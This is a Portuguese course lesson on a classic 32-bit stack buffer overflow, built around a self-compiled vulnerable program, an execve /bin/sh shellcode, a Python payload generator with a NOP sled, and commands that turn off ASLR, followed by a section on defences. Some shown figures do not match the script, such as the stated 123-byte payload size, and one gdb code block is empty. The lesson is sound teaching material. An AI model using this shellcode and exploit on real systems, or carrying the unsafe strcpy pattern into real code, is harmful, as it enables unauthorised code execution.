4.05

Buffer overflow clássico (stack): ret2shellcode em 32 bits

Do offset ao EIP: compilar vulnerável, gerar payload e obter shell

Nível: Avançado/Cyber Duração: ~55 min Pré-requisitos: T4.03 (anatomia da memória), T4.04 (gdb/objdump), T0.01 (gdb básico)

🎯 Objetivos

Reproduzir, num laboratório isolado e em um binário criado por você, o ataque mais clássico da história: estouro de buffer na pilha para sequestrar o EIP e executar shellcode (execve /bin/sh). Inclui: frame 32-bit, cálculo do offset, NOP sled, shellcode, geração do payload em python e condições de compilação didáticas, sempre em WSL2/VM com ASLR desligado por sessão.

📖 Leitura guiada

Foco da leitura: Leitura historiográfica (referências clássicas, para entender de onde vem tudo): "Smashing The Stack For Fun And Profit" (Aleph One, Phrack 49, 1996) e o tutorial da Corelan "Exploit writing tutorial part 1: Stack Based Overflows" (https://www.corelan.be/). O primeiro é optativo e em inglês arcaico; o segundo é passo a passo moderno. Nós seguimos o mesmo método, sem os exploits de network e só no nosso binário.

O cenário (didático, 32 bits)

Vamos explorar um binário 32-bit mesmo em uma máquina 64-bit. Por quê? Nos 32 bits o modelo mental é mais direto: endereço de retorno = 4 bytes, argumentos de função na pilha, e o endereço da pilha cabe num único word. Uma vez que o ataque clica em 32 bits, migrar a ideia para 64 bits é trocar 4 por 8 e lidar com registradores de argumentos (vamos ver a versão ret2libc 64-bit no módulo 06).

Aviso: este módulo desativa proteções e desliga ASLR por sessão. Isso acontece APENAS dentro do seu lab (WSL2/VM), em um binário que você mesmo compilou, que não toca nenhum serviço real de produção. Ao terminar, apague os binários e reative o ASLR.

O programa vulnerável

O alvo copia o primeiro argumento (sua entrada) para um buffer local de 64 bytes com strcpy, sem limite — CWE-121 (stack-based buffer overflow). Compilamos com as flags didáticas -m32 (binário 32-bit), -fno-stack-protector (sem canário), -z execstack (pilha executável — sem NX) e -no-pie (endereços fixos).

Código — prog_trivial.c (VULNERÁVEL)
/* prog_trivial.c -- alvo didático do module 05 (VULNERAVEL).
   Compile NO LINUX/WSL (compile 32-bit precisa do multilib):
   sudo apt install gcc-multilib
   gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
   NUNCA use estas flags em codigo real. */
#include <stdio.h>
#include <string.h>

static void vulneravel(char *entrada)
{
    char buf[64];
    strcpy(buf, entrada);            /* CWE-121: copia sem limite */
    printf("recebido: %s\n", buf);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        printf("uso: %s <payload>\n", argv[0]);
        return 1;
    }
    vulneravel(argv[1]);
    return 0;
}
Saída esperada
$ gcc -m32 -fno-stack-protector -z execstack -no-pie -g prog_trivial.c -o prog_trivial
$ ./prog_trivial "AAAA"
recebido: AAAA

A geometria do ataque

Na frame de vulneravel, a pilha (32 bits) tem esta ordem, de endereço baixo para alto: buf[64] → saved EBP (4 bytes) → return address (4 bytes) → args do chamador. O strcpy escreve para cima:

Código — geometria
enderecos altos
  +----------------------------+
  | argumento (entrada externa)|
  | return address   <-- alvo  = o que queremos reescrever
  | saved EBP                |
  +----------------------------+
  | buf[64]  <- strcpy escreve      |
  +----------------------------+
enderecos baixos
  "Se escrevermos 64+4 bytes de lixo e mais 4 bytes com o
   endereco do nosso shellcode, o ret vai pular para la."

Medindo o offset com o gdb

Offset = distância de &buf até o return address. Não chute: meça. No gdb, pare no início de vulneravel e compare $ebp com &buf:

Código — medindo o offset
gdb ./prog_trivial
(gdb) break vulneravel
(gdb) run "AAAA"
(gdb) p/x $ebp
$1 = 0xbfffefd8
(gdb) p &buf
$2 = (char (*)[64]) 0xbfffef8c
(gdb) p 0xbfffefd8 - 0xbfffef8c     # espaco do buf ate o EBP
$3 = 76
(gdb) p/x (char *)&buf + 76 + 4       # onde fica o ret address
$4 = 0xbffff020
(gdb) quit
Saída esperada
--> offset = 76 bytes ate o saved EBP;
     com +4 chegamos no return address (offset total 80).

Shellcode: a "bomba de execução" de execve

Shellcode é uma sequência de código de máquina que, ao ser executada, faz o processo servir uma shell. O clássico para 32-bit (23 bytes) monta execve("/bin/sh", NULL, NULL):

  • \x31\xc0 — xor eax,eax (zera EAX = nº da syscall).
  • \x50 — push eax (fim da string, NUL).
  • \x68\x2f\x2f\x73\x68 → //sh; \x68\x2f\x62\x69\x6e → /bin (juntos: "/bin//sh", com // = pad).
  • \x89\xe3 — mov ebx,esp (argv[0] = a string).
  • \x50\x53 — push eax; push ebx (argv=NULL, path).
  • \x89\xe1 — mov ecx,esp (argv).
  • \xb0\x0b — mov al,11 (syscall execve).
  • \xcd\x80 — int 0x80 (chamada ao kernel).
Código — shellcode execve /bin/sh
\x31\xc0\x50\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53
\x89\xe1\xb0\x0b\xcd\x80

NOP sled e o payload completo

O endereço exato do início do buffer varia (mesmo com ASLR desligado). Para errar por pouco, colocamos um NOP sled (muitos 0x90 = "não faça nada") antes do shellcode: a CPU desliza pelos NOPs e, se cair em QUALQUER ponto do sled, termina no shellcode. O payload final: [NOP sled][shellcode][padding][ret para o meio do sled].

O endereço ret é o valor de &buf da sua sessão (na saída acima: 0xbfffef8c). Aponte para um pouco DENTRO do sled para dar folga. Desligue o ASLR só para esta sessão no lab:

Código — exploit.py
#!/usr/bin/env python3
# exploit.py -- genera o payload do prog_trivial (roda NO LINUX/WSL).
import struct, sys

# Valores medidos NA SUA sessao do gdb (section "medindo o offset").
offset = 76                       # buf -> saved EBP
ret    = 0xbfffef8c + 16          # aponta um pouco dentro do sled

nopsled    = b"\x90" * 96
shellcode  = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
    b"\x89\xe1\xb0\x0b\xcd\x80"
)

payload = nopsled + shellcode
payload += b"A" * (offset - len(payload))   # padding ate o EBP
payload += b"B" * 4                          # saved EBP
payload += struct.pack("<I", ret)            # return address

sys.stdout.buffer.write(payload)
Saída esperada
$ python3 exploit.py > payload.bin
$ wc -c payload.bin
123

Executando o exploit (com ASLR desligado por sessão)

Desligue a randomização apenas nesta sessão do lab (o comando é do usuário root). Duas opções seguras: sudo setarch i686 -R ./prog_trivial "$(cat payload.bin)" (desativa ASLR para aquele processo) ou, dentro de um shell raiz somente do lab, echo 0 > /proc/sys/kernel/randomize_va_space. Reative com echo 2 > ... ao final dos estudos.

Se o endereço ret não bater (crash), o gdb mostra o motivo: error no ret address. Reconfira &buf, ajuste o offset/endereço e tente de novo — exploração é engenharia de precisão, não sorte.

Código — executando o exploit
$ python3 exploit.py > payload.bin
$ sudo setarch i686 -R ./prog_trivial "$(cat payload.bin)"
recebido: <bytes-lixo>
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ exit
Saída esperada
Com o payload certo, o programa PULA para o NOP sled,
desliza ate o shellcode e chama execve("/bin/sh"):
voce ve um prompt de shell vinda do proprio processo.

Observando o salto no gdb (didático)

Para ver o salto acontecendo, rode o exploit dentro do gdb (sem shell, apenas para inspecionar):

Código — exploit sob o gdb

64 bits: por que usamos o binário 32-bit para aprender

Em 64-bit a mesma ideia existe, mas o terreno muda: (1) o return address tem 8 bytes e endereços de pilha têm bytes zero no topo (0x00007fff...), o que quebra payloads com strings terminadas em NUL; (2) os 6 primeiros argumentos de função vão em registradores (rdi, rsi, …), não na pilha — então "empurrar valores na pilha e retornar para uma função" não funciona direto (precisamos de gadgets, módulo 06); (3) a ASLR está ligada. Metodologia escolhida pelo curso: dominar a mecânica em 32 bits com a pilha executável, e então aplicar o mesmo raciocínio nas mitigações (módulo 06), onde o 64-bit retorna com o ret2libc via ROP.

Como se defender

  • A primeira defesa é não existir o bug: copie com tamanho (snprintf) — o módulo 02 inteiro.
  • Ligue o canário de pilha (-fstack-protector-all): o overflow destrói o canário e o processo aborta antes do ret — exatamente o que este exploit dependia de NÃO ter.
  • Mantenha NX/execstack desabilitado a pilha de executar código: sem -z execstack, o "shellcode na pilha" não executa (a CPU nega a página) — veremos o bypass (ret2libc) e a defesa correspondente no módulo 06.
  • Mantenha PIE ligado e a ASLR ativa no sistema: sem endereço fixo da pilha, o ret hardcoded do payload não converge.
  • Lembre: um sistema bem configurado exigiria 4 coisas ao mesmo tempo para este ataque (bug + sem canário + execstack + ASLR desligado). Cada uma que você mantém ligada defende.
  • Trate a exploração aqui como zoom: o objetivo ao aplicar os mesmos conceitos defensivamente é reconhecer esse bug na tela de um crash ou SAST e saber o porquê.

✏️ Exercícios

Nível 1

Exercício 4.05.1

Você troca -z execstack por nada (NX ativo): recompile o prog_trivial equilibrado (sem execstack, sem canário, -no-pie) e rode o payload do módulo. O que acontece agora e por quê? (Não precisa relatar saída exata: explique o fenômeno.)

Dica: A página da pilha está marcada NX (não-executável): o RIP pular para a pilha gera SIGSEGV com "executable stack" ou "cannot access memory".

Ver solução
$ gcc -m32 -fno-stack-protector -no-pie -g prog_trivial.c -o prog_trivial_nx
$ python3 exploit.py > payload.bin
$ sudo setarch i686 -R ./prog_trivial_nx "$(cat payload.bin)"
Program received signal SIGSEGV
# O EIP foi para o NOP sled, mas a CPU NEGOU executar
# codigo vindo de uma pagina NX (PAE/DEP). Nenhum shell.

Esse é o princípio do DEP/NX: você pode saltar para a pilha, mas não executar o que está nela. O módulo 06 mostra o que o atacante troca por isso.

Nível 2

Exercício 4.05.2

Mude o payload para retornar para um endereço ERRADO de propósito (ex.: ret = 0xdeadbeef) e rode no gdb. Leia a mensagem de erro e anote o EIP no momento do crash. O que essa informação te diz sobre o controle do fluxo?

Dica: O EIP no crash é 0xdeadbeef — o programa seguiu exatamente o que você escreveu no ret address.

Ver solução
(gdb) run "$(cat payload_bad.bin)"
Program received signal SIGSEGV.
=> 0xdeadbeef in ?? ()
An error occurred while disassembling ...
(gdb) info registers eip
eip            0xdeadbeef

Controle total do EIP confirmado. Daqui para o shell é só acertar o alvo do pulo.

Nível 3

Exercício 4.05.3

Variação: troque o shellcode para spawnar id e sair limpo. Use o mesmo padrão (execve) apontando para "/bin//sh" seguido de -c…; se ficar difícil, compile um C com o syscall execve("/bin/sh") e veja o disassembly — o exercício é usar o gdb para "copiar" o shellcode do seu próprio programa. Descreva o que você capturou.

Dica: Compile int main(){ execve("/bin/sh",0,0); }, desassemble com objdump -d -M intel, e veja como o compilador constrói a string e a syscall.

Ver solução
/* mini.c -- fonte de onde "copiar" instrucoes para shellcode */
#include <unistd.h>
int main(void) {
    char *argv[2] = { "/bin//sh", NULL };
    execve(argv[0], argv, NULL);
    return 0;
}

O disassembly deixa claro o padrão: construir a string na pilha (push), colocar endereço em ebx/ecx/edx e fazer a syscall 11. O shellcode 23-byte que usamos é essa rotina "enxuta".

Critérios de aceite

  • Compilação com -m32 -fno-stack-protector -z execstack -no-pie documentada e funcionando.
  • Offset e &buf medidos (não chutados) e compatíveis com o exploit.
  • Exploit executado com setarch i686 -R e shell obtida.
  • Sessão gdb mostrando o EIP no sled e no shellcode.
  • Reativação da ASLR e limpeza dos binários indicados no final.
